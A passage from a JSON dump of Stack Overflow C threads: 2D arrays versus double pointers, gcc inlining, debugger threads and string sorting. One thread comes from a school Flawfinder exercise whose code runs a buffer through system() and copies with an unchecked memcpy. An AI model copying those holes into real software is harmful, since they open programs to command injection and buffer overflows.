"profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1459338936, "post_id": 36307817, "comment_id": 60239592, "body": "<code>arr[i]</code> is the same as <code>(*((arr)+(i)))</code>. <code>arr[i][j]</code> is the same as <code>(*(*((arr)+(i)))+(j))</code>."}, {"owner": {"reputation": 26583, "user_id": 1441, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/fb7f1cd450084fdb4bfc9376c7dba2a7?s=128&d=identicon&r=PG", "display_name": "crashmstr", "link": "https://stackoverflow.com/users/1441/crashmstr"}, "edited": false, "score": 2, "creation_date": 1459339113, "post_id": 36307817, "comment_id": 60239726, "body": "Did you even read the article you link to? The code you show comes from a section that says it does not work! <i>&quot;It happens because two dimensional array matrix and double pointer pmat are different types and using them in similar fashion points to different locations in memory.&quot;</i>"}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1459339440, "post_id": 36307817, "comment_id": 60239926, "body": "Your array and pointer declarations are incompatible.  An <code>int **ptr</code> pointer can never be used to access an <code>int a[2][2]</code> array.  The compiler would have told you this if you hadn&#39;t suppressed the error message with a cast.  Tip:  Do <i>not</i> use casts for this sort of pointer assignment.  If a cast is needed, it&#39;s most likely masking a bug."}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1459339467, "post_id": 36307817, "comment_id": 60239943, "body": "Your <code>ptr</code> is of type <code>int **</code>. Your <code>a</code> is an array of type <code>int [2][2]</code>. In most expressions, <code>a</code> will decay to a pointer of type <code>int (*)[2]</code>. That is not the same type as your <code>ptr</code>."}, {"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1459339938, "post_id": 36307817, "comment_id": 60240272, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/4470950/why-cant-we-use-double-pointer-to-represent-two-dimensional-arrays\">Why can&#39;t we use double pointer to represent two dimensional arrays?</a>"}, {"owner": {"reputation": 885, "user_id": 5040900, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FeFEC.jpg?s=128&g=1", "display_name": "Siddhant Rimal", "link": "https://stackoverflow.com/users/5040900/siddhant-rimal"}, "reply_to_user": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1459603459, "post_id": 36307817, "comment_id": 60365450, "body": "@KlasLindb&#228;ck , +1 for that link. I wonder why I never found it. Maybe incorrect keywords. Answers some of my questions so you are partially correct. This is a possible <b>partial</b> duplicate of that question."}, {"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1459753294, "post_id": 36307817, "comment_id": 60409292, "body": "@lancel0t Is there a good canonical answer describing the difference between double pointer and multidimensional arrays? Cause it is very common that people don&#39;t know the difference."}], "answers": [{"comments": [{"owner": {"reputation": 885, "user_id": 5040900, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FeFEC.jpg?s=128&g=1", "display_name": "Siddhant Rimal", "link": "https://stackoverflow.com/users/5040900/siddhant-rimal"}, "edited": false, "score": 0, "creation_date": 1459345161, "post_id": 36308386, "comment_id": 60244419, "body": "Could you recommend me some reading materials or online tutorials/courses to zip through this quickly. I seem to have developed a LOT of misconceptions and incorrect information on C programming concepts. I would like to know a nice place to start. Thanks for this detailed explaination btw. Was really helpful. I want to learn about all the basic must-know things like the relation &amp;arr[i][j] == &amp;arr[0][0] + i * M + j that you wrote over there."}], "tags": [], "owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "is_accepted": true, "score": 5, "last_activity_date": 1459339593, "creation_date": 1459339593, "answer_id": 36308386, "question_id": 36307817, "link": "https://stackoverflow.com/questions/36307817/what-is-the-address-an-array-element-is-printing-from/36308386#36308386", "title": "What is the address an array element is printing from?", "body": "<p>A 2D array and a pointer to pointer are different animals!</p>\n\n<p>A 2D array, say <code>int arr[N][M]</code>, is an array of N*M consecutive elements with the following relation <code>&amp;arr[i][j] == &amp;arr[0][0] + i * M + j</code>.</p>\n\n<p>A pointer of pointers is a pointer to an array of pointers, each pointing to another array.</p>\n\n<p>So what can you do?</p>\n\n<ul>\n<li><p>process the array as a 1D array with explicit indexing</p>\n\n<pre><code>int main()\n{\n  int a[2][2]={{5,7},\n               {0,1}};\n  int* ptr=a[0];  // a[0] decays to a pointer...\n  int i,j;\n  for(i=0;i&lt;2;i++){\n    for(j=0;j&lt;2;j++){\n        printf(\"%d printing from==&gt;%x\\n\",ptr[j + 2 *i],ptr + j + 2 * i);\n    }\n  }\n  //getch();\n  return(0);\n}\n</code></pre></li>\n<li><p>explicitely creates an array of pointers</p>\n\n<pre><code>int main()\n{\n  int a[2][2]={{5,7},\n               {0,1}};\n  int *b[] = { a[0], a[1] };  // array of pointers pointing to beginning or rows\n  int** ptr=b;  // b decays to a pointer to pointer\n  int i,j;\n  for(i=0;i&lt;2;i++){\n    for(j=0;j&lt;2;j++){\n        printf(\"%d printing from==&gt;%x\\n\",ptr[i][j],&amp;(ptr[i][j]));\n    }\n  }\n  //getch();\n  return(0);\n}\n</code></pre></li>\n<li><p>explictely use a pointer to array of definite size:</p>\n\n<pre><code>int main()\n{\n  int a[2][2]={{5,7},\n               {0,1}};\n  int (*ptr)[2] = a;  // a decays to a pointer arrays of size 2\n  int i,j;\n  for(i=0;i&lt;2;i++){\n    for(j=0;j&lt;2;j++){\n        printf(\"%d printing from==&gt;%x\\n\",ptr[i][j],&amp;(ptr[i][j]));\n    }\n  }\n  //getch();\n  return(0);\n}\n</code></pre></li>\n</ul>\n\n<p>Also note that I have no explicit cast in above code to let the compiler control that the inderection levels are correct.</p>\n"}], "owner": {"reputation": 885, "user_id": 5040900, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FeFEC.jpg?s=128&g=1", "display_name": "Siddhant Rimal", "link": "https://stackoverflow.com/users/5040900/siddhant-rimal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 926, "favorite_count": 0, "accepted_answer_id": 36308386, "answer_count": 1, "score": 1, "last_activity_date": 1459343689, "creation_date": 1459338244, "last_edit_date": 1495535307, "question_id": 36307817, "link": "https://stackoverflow.com/questions/36307817/what-is-the-address-an-array-element-is-printing-from", "title": "What is the address an array element is printing from?", "body": "<hr>\n\n<p><strong>UPDATE:</strong> A possible duplicate of this question has been reported. While the answers submitted to <a href=\"https://stackoverflow.com/questions/4470950/why-cant-we-use-double-pointer-to-represent-two-dimensional-arrays\">that question</a> partially solves this one, to explain <a href=\"https://stackoverflow.com/questions/4470950/why-cant-we-use-double-pointer-to-represent-two-dimensional-arrays\">why we can't use double pointers to represent two dimensional arrays</a>, it <strong>does not</strong> specify how to access the correct memory address of values which are stored in the pointer; which is the primary theme of this question. The marked answer in this question does an excellent job of clarifying, <em>to anyone confused in the <strong>future</em></strong>, about why this is a misunderstood concept and alternative ways on how it can be resolved. This may be useful for future readers who would like to trace the output to understand the concept better!(If you look closely at the <a href=\"https://stackoverflow.com/questions/4470950/why-cant-we-use-double-pointer-to-represent-two-dimensional-arrays#comment4886926_4470963\">comments by the OP in that question</a>, you will realise that the tracing is not clear enough for him to understand. A <strong><em>part</strong> of that question</em> present here gives a much better tracing example so that just about anyone can easily understand)<br/><br/>\n(rest of the question is in its <em>un-edited</em> glory for future readers to reflect upon  similar mistake if they happen to make it.)</p>\n\n<hr>\n\n<h2><strong>What I'm trying to do:</strong></h2>\n\n<ul>\n<li>Trying to see how pointers are used instead of 2D arrays</li>\n<li>In this case, I'm inserting values to a 2D array(<em>namely, a[ ][ ]</em>)</li>\n<li>I am trying to access the values in that array with a pointer(<em>namely, ptr</em>)</li>\n<li>I am also trying to trace the memory address from which those values are being taken from</li>\n<li>Trying to know <strong>where I'm going wrong?</strong> (would appreciate an appropriate explanation and if possible, a link to reference and learn further)</li>\n</ul>\n\n<p><strong>What I've tried:</strong><br/>\nBelow is a sample code:</p>\n\n<pre><code>int main()\n{\n  int a[2][2]={{5,7},\n               {0,1}};\n  int** ptr=(int**)a;\n  int i,j;\nfor(i=0;i&lt;2;i++){\n    for(j=0;j&lt;2;j++){\n        printf(\"%d printing from==&gt;%x\\n\",&amp;ptr[i][j],((&amp;ptr[i])+j));\n   }\n  }\n  getch();\n  return(0);\n}\n</code></pre>\n\n<p>In the above code, I'm trying to print the values present inside matrix a[ ][ ] with the help of pointer ptr. In doing so, I am tracing the address from where(<em>in the memory address</em>) the printing actually takes place. I seem to have encountered a <strong>disastrous output</strong> in the form of:</p>\n\n<blockquote>\n  <p>5 printing from ==>12ff7c<br/>\n  9 printing from ==>12ff80<br/>\n  7 printing from ==>12ff80<br/>\n  11 printing from ==>12ff84</p>\n</blockquote>\n\n<p>Then I modified the line:</p>\n\n<pre><code>printf(\"%d printing from==&gt;%x\\n\",&amp;ptr[i][j],((&amp;ptr[i])+j));\n</code></pre>\n\n<p>with this:</p>\n\n<pre><code>printf(\"%d printing from==&gt;%d\\n\",&amp;ptr[i][j],*((&amp;ptr[i])+j));\n</code></pre>\n\n<p>to know which values were <strong><em>actually</em></strong> present in those addresses:</p>\n\n<blockquote>\n  <p>5 printing from ==>5<br/>\n  9 printing from ==>7<br/>\n  7 printing from ==>7<br/>\n  11 printing from ==>0</p>\n</blockquote>\n\n<p><strong>My take on this is that:</strong> &amp;ptr[i][j] is equivalent to (*(&amp;ptr[i])+j))\nand ((&amp;ptr[i])+j)) doesn't really tell me the addresses of even those numbers because &amp;ptr[i] defines an address which is incremented by j in this case(but since j is reset to 0 in each outer loop iteration; that will cause same memory address to be pointed twice)\n<strong><em>Am I wrong with this chain of thought?</em></strong></p>\n\n<h2><strong>How can you help me?</strong></h2>\n\n<ul>\n<li><a href=\"http://cpp.sh/97i5z\" rel=\"nofollow noreferrer\">Here is my code</a> failing miserably, and based upon the article on <strong><em>Double Pointer and Two Dimensional Arrays in C</em></strong> that I read <a href=\"http://cs-fundamentals.com/c-programming/arrays-in-c.php\" rel=\"nofollow noreferrer\">here</a>. Have I fundamentally misunderstood it?</li>\n<li>Could you post a correct cpp code by modifying my given code <a href=\"http://cpp.sh/97i5z\" rel=\"nofollow noreferrer\">here</a> and posting your own perma-link in the comments?(You can do that by clicking the \"GET URL\" button below the coding area in that site)</li>\n<li><em>I would highly appreciate an answer based on C instead of C++ where typedef ans such is possible</em> I am trying to learn pointers better</li>\n</ul>\n"}, {"tags": ["c++", "c", "gcc", "stack", "inline"], "comments": [{"owner": {"reputation": 3110, "user_id": 5470144, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/VVhju.jpg?s=128&g=1", "display_name": "Elad Weiss", "link": "https://stackoverflow.com/users/5470144/elad-weiss"}, "edited": false, "score": 0, "creation_date": 1459337568, "post_id": 36307443, "comment_id": 60238625, "body": "Thanks Yu, didn&#39;t know it was wrong."}, {"owner": {"reputation": 3110, "user_id": 5470144, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/VVhju.jpg?s=128&g=1", "display_name": "Elad Weiss", "link": "https://stackoverflow.com/users/5470144/elad-weiss"}, "edited": false, "score": 0, "creation_date": 1459341340, "post_id": 36307443, "comment_id": 60241313, "body": "Guess: The (*num_failures) access requires local variable. Either the number of registers or stack size available for &#39;test()&#39; is exceeded, hence causing the compiler to split it in the next available point, which is foo2()."}, {"owner": {"reputation": 1519, "user_id": 203719, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/2c3a9d5c4c1e6526058b191733a0731a?s=128&d=identicon&r=PG", "display_name": "Ant", "link": "https://stackoverflow.com/users/203719/ant"}, "edited": false, "score": 1, "creation_date": 1464964093, "post_id": 36307443, "comment_id": 62716523, "body": "I think inline is a hint to the compiler which may choose to ignore it."}], "answers": [{"tags": [], "owner": {"reputation": 3110, "user_id": 5470144, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/VVhju.jpg?s=128&g=1", "display_name": "Elad Weiss", "link": "https://stackoverflow.com/users/5470144/elad-weiss"}, "is_accepted": true, "score": 1, "last_activity_date": 1465107134, "creation_date": 1465107134, "answer_id": 37639021, "question_id": 36307443, "link": "https://stackoverflow.com/questions/36307443/a-function-stops-being-inline-any-explanation/37639021#37639021", "title": "A function stops being inline. Any explanation?", "body": "<p>After learning some more on the subject, and seeing some lectures by Chandler Caruth, I would say the compiler decides almost indeterministicly where to inline the code. Especially when not givinig it any 'inline' hints, as in my case.</p>\n"}], "owner": {"reputation": 3110, "user_id": 5470144, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/VVhju.jpg?s=128&g=1", "display_name": "Elad Weiss", "link": "https://stackoverflow.com/users/5470144/elad-weiss"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 151, "favorite_count": 0, "accepted_answer_id": 37639021, "answer_count": 1, "score": 5, "last_activity_date": 1465107134, "creation_date": 1459337248, "last_edit_date": 1459338885, "question_id": 36307443, "link": "https://stackoverflow.com/questions/36307443/a-function-stops-being-inline-any-explanation", "title": "A function stops being inline. Any explanation?", "body": "<p>I have a code of the following structure:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>void foo1(uint32_t *num_failures)\n{\n   ...\n}\n\nvoid foo2(uint32_t *num_failures)\n{\n   ...\n}\n\nvoid foo3(uint32_t *num_failures)\n{\n   ...\n}\n\nvoid test()\n{\n   uint32_t num_failures = 0;\n   foo1(&amp;num_failures);\n   foo2(&amp;num_failures);\n   foo3(&amp;num_failures);\n}\n</code></pre>\n\n<p>Now, what I did was add the following instruction to <strong>foo1()</strong>:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>void foo1(uint32_t *num_failures)\n{\n   ...\n   (*num_failures)++;\n}\n</code></pre>\n\n<p>And suddenly I see that stack size printed from inside <strong>foo2()</strong> is larger by 36 bytes.</p>\n\n<p>I did an objdump and greped for &lt;symbols&gt;. Yielding the following:</p>\n\n<p>Before the change:</p>\n\n<pre><code>...\n00004e08 &lt;test&gt;:\n</code></pre>\n\n<p>After the change:</p>\n\n<pre><code>...\n00004e08 &lt;foo2&gt;:\n00005588 &lt;test&gt;:\n</code></pre>\n\n<p>So I guess the function foo2 stopped being inline. </p>\n\n<ol>\n<li>Am I correct?</li>\n<li>Any explanation why that happened?</li>\n<li>What happened to foo3() after the change? Did it become inline inside <strong>foo2()</strong> or inside <strong>test()</strong>?</li>\n</ol>\n\n<p>Not sure if required: I'm using gcc for arc processor.</p>\n"}, {"tags": ["c++", "c", "security", "warnings", "flawfinder"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1459337581, "post_id": 36307269, "comment_id": 60238638, "body": "The correct code for the <code>system</code> function, it not using it. The function is inherently unsafe because it potentially allows execution of another program out of your control. The second one with <code>memcpy</code> is also rather explicit, you don&#39;t check for any potential overflow, because the size of <code>buf2</code> is potentially unknown. But remember, these are just warnings."}, {"owner": {"reputation": 11, "user_id": 6134308, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6iT68.jpg?s=128&g=1", "display_name": "ZioNick", "link": "https://stackoverflow.com/users/6134308/zionick"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1459337716, "post_id": 36307269, "comment_id": 60238747, "body": "Hi! Thanks for the answer! I know the things you said, but for school I have to solve this warnings and I don&#39;t know how... :("}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1459337846, "post_id": 36307269, "comment_id": 60238834, "body": "For the <code>memcpy</code> case try something as <code>copy_data(char *buf1, char *buf2, int size) {memcpy(buf2,buf1, size); ...}</code>, and <code>copy_data(xx, yy, STR_SIZE);</code>."}, {"owner": {"reputation": 11, "user_id": 6134308, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6iT68.jpg?s=128&g=1", "display_name": "ZioNick", "link": "https://stackoverflow.com/users/6134308/zionick"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1459338299, "post_id": 36307269, "comment_id": 60239133, "body": "&#39;copy_data&#39; : function does not take 3 arguments Argh..."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1459338375, "post_id": 36307269, "comment_id": 60239188, "body": "Yes, <code>copy_data</code> doesn&#39;t take 3 arguments, and that&#39;s exactly the problem. Are you allowed to modify the source code in order of getting rid of the warnings ? If not, you can&#39;t get rid of the warnings."}, {"owner": {"reputation": 11, "user_id": 6134308, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6iT68.jpg?s=128&g=1", "display_name": "ZioNick", "link": "https://stackoverflow.com/users/6134308/zionick"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1459338580, "post_id": 36307269, "comment_id": 60239334, "body": "Oh, ok ok... Yes, it is allowed, but I don&#39;t know how to do."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1459338653, "post_id": 36307269, "comment_id": 60239382, "body": "Well, then it&#39;s about time to learn the basics of the C language."}, {"owner": {"reputation": 11, "user_id": 6134308, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6iT68.jpg?s=128&g=1", "display_name": "ZioNick", "link": "https://stackoverflow.com/users/6134308/zionick"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1459338740, "post_id": 36307269, "comment_id": 60239443, "body": "Thanks to your answer... I&#39;ll do it... :)"}], "owner": {"reputation": 11, "user_id": 6134308, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6iT68.jpg?s=128&g=1", "display_name": "ZioNick", "link": "https://stackoverflow.com/users/6134308/zionick"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 862, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1459338130, "creation_date": 1459336796, "last_edit_date": 1459338130, "question_id": 36307269, "link": "https://stackoverflow.com/questions/36307269/i-cant-solve-this-flawfinder-warning-cwe-78-cwe-120", "title": "I can&#39;t solve this Flawfinder Warning (CWE-78, CWE-120)", "body": "<p>I can't solve these two warnings found by Flawfinder. Could you answer to me with an example of the correct code?</p>\n\n<p><strong>Final results:</strong></p>\n\n<pre><code>flawfinder_exercise_old_SAL_syntax.cpp:48:  [4] (shell) system:\n  This causes a new program to execute and is difficult to use safely\n  (CWE-78). try using a library call that implements the same functionality\n  if available.&lt;br&gt;\nflawfinder_exercise_old_SAL_syntax.cpp:36:  [2] (buffer) memcpy:\n  Does not check for buffer overflows when copying to destination (CWE-120).\n  Make sure destination can always hold the source data.*\n</code></pre>\n\n<p>This is the one in line 48:</p>\n\n<pre><code>int execute(char *buf) {\n    return system(buf); // pass buf as command to be executed by the OS\n}\n</code></pre>\n\n<hr>\n\n<p>This is the one in line 36:</p>\n\n<pre><code>void copy_data(char *buf1,\n               char *buf2) {\n    memcpy(buf2,buf1,STR_SIZE); \n    buf2[STR_SIZE-1] = NULL; // null terminate, just in case\n}\n</code></pre>\n"}, {"tags": ["c", "windows", "multithreading", "visual-studio"], "comments": [{"owner": {"reputation": 33265, "user_id": 886887, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/1616c7e4fab23f6e014ee11d75408bba?s=128&d=identicon&r=PG", "display_name": "Harry Johnston", "link": "https://stackoverflow.com/users/886887/harry-johnston"}, "edited": false, "score": 0, "creation_date": 1459403912, "post_id": 36307259, "comment_id": 60273081, "body": "Good question.  I would hazard a <i>guess</i> that you are running a 32-bit application and that these are 64-bit threads used by the WOW64 system."}, {"owner": {"reputation": 2747, "user_id": 220594, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/2471c61947385b1d7c0be89482373c26?s=128&d=identicon&r=PG", "display_name": "Pyjong", "link": "https://stackoverflow.com/users/220594/pyjong"}, "reply_to_user": {"reputation": 33265, "user_id": 886887, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/1616c7e4fab23f6e014ee11d75408bba?s=128&d=identicon&r=PG", "display_name": "Harry Johnston", "link": "https://stackoverflow.com/users/886887/harry-johnston"}, "edited": false, "score": 0, "creation_date": 1459407377, "post_id": 36307259, "comment_id": 60274925, "body": "@HarryJohnston Unfortunatelly not. In this case the application was x64. If I compile project for x86 the entry name is Win32 Thread. I assume you suspect that the debugger could create more handles to my threads. That&#39;s so a good guess. So I found those handles in Process Explorer after all. In devenv.exe (they have different stacks so they are probably not related to my threads). No idea why do they put these in there as an option since you can&#39;t really use it in any way, but pfffft.. I don&#39;t care &lt;- not my handles. If you want you can state this as an answer and I accept it :)"}, {"owner": {"reputation": 33265, "user_id": 886887, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/1616c7e4fab23f6e014ee11d75408bba?s=128&d=identicon&r=PG", "display_name": "Harry Johnston", "link": "https://stackoverflow.com/users/886887/harry-johnston"}, "edited": false, "score": 0, "creation_date": 1459460841, "post_id": 36307259, "comment_id": 60310547, "body": "Nah, you did the work - go ahead and answer it yourself."}, {"owner": {"reputation": 161657, "user_id": 122718, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/213Kw.png?s=128&g=1", "display_name": "usr", "link": "https://stackoverflow.com/users/122718/usr"}, "edited": false, "score": 0, "creation_date": 1459503503, "post_id": 36307259, "comment_id": 60325903, "body": "Thread <i>handles</i> are not showing up in the threads window. Only actual threads are."}, {"owner": {"reputation": 2747, "user_id": 220594, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/2471c61947385b1d7c0be89482373c26?s=128&d=identicon&r=PG", "display_name": "Pyjong", "link": "https://stackoverflow.com/users/220594/pyjong"}, "reply_to_user": {"reputation": 161657, "user_id": 122718, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/213Kw.png?s=128&g=1", "display_name": "usr", "link": "https://stackoverflow.com/users/122718/usr"}, "edited": false, "score": 0, "creation_date": 1459504852, "post_id": 36307259, "comment_id": 60326748, "body": "@usr You are right, my bad. The number I was talking about is actually the thread ID, but the problem and explanation remain the same. I didn&#39;t create those threads and ProcExplorer shows only those I actually created. (+thread IDs as part of the name of the object, which is why I mixed it up)"}], "owner": {"reputation": 2747, "user_id": 220594, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/2471c61947385b1d7c0be89482373c26?s=128&d=identicon&r=PG", "display_name": "Pyjong", "link": "https://stackoverflow.com/users/220594/pyjong"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 200, "favorite_count": 1, "answer_count": 0, "score": 3, "last_activity_date": 1459336772, "creation_date": 1459336772, "question_id": 36307259, "link": "https://stackoverflow.com/questions/36307259/what-are-win64-threads-in-msvs-debugger", "title": "What are Win64 threads in MSVS debugger?", "body": "<p>for some time I have been noticing entries named \"Win64 Thread\" in the combo box for switching threads in Visual Studio (2010). What are they? I do multithread but I don't think I am the one who creates these ones. Process Explorer shows in my opinion correct number of thread handles which is the number of all entries in that combo box minus those named Win64 Thread. What is going on?</p>\n"}, {"tags": ["c", "arrays", "sorting"], "comments": [{"owner": {"reputation": 3506, "user_id": 1110338, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/cePRv.jpg?s=128&g=1", "display_name": "AngryDuck", "link": "https://stackoverflow.com/users/1110338/angryduck"}, "edited": false, "score": 0, "creation_date": 1459334299, "post_id": 36306329, "comment_id": 60236291, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/12646734/how-to-sort-an-array-of-string-alphabetically-case-sensitive-nonstandard-colla\">How to sort an array of string alphabetically (case sensitive, nonstandard collation)</a>"}, {"owner": {"reputation": 4352, "user_id": 2483038, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/cdaf35803110c235e3122cb85c113131?s=128&d=identicon&r=PG&f=1", "display_name": "blazs", "link": "https://stackoverflow.com/users/2483038/blazs"}, "edited": false, "score": 0, "creation_date": 1459334474, "post_id": 36306329, "comment_id": 60236434, "body": "Is this code not working?"}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1459334529, "post_id": 36306329, "comment_id": 60236470, "body": "Show the comparison function."}, {"owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "reply_to_user": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 1, "creation_date": 1459334586, "post_id": 36306329, "comment_id": 60236508, "body": "@2501, the comparison function is <code>strcmp</code> :)"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 1, "creation_date": 1459334641, "post_id": 36306329, "comment_id": 60236553, "body": "You cannot use <code>strcmp</code> directly as an comparison function: it has wrong argument types. You need to make a wrapper function for it."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1459334767, "post_id": 36306329, "comment_id": 60236642, "body": "Please provide <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. Knowing how you call <code>sort_string_array</code> is important."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 